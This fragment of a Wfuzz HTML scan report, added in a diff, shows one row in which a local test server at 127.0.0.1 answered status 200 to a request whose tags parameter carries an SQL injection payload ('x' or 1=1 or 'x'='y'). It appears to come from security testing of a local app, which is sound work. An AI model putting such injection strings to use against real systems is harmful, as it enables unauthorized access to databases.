+<tr><td>00121</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=x'%20or%201=1%20or%20'x'='y>http://127.0.0.1:5000/api/posts?tags=x'%20or%201=1%20or%20'x'='y</a></td></tr>
+</table></body></html><h5>Wfuzz by EdgeSecurity<h5>
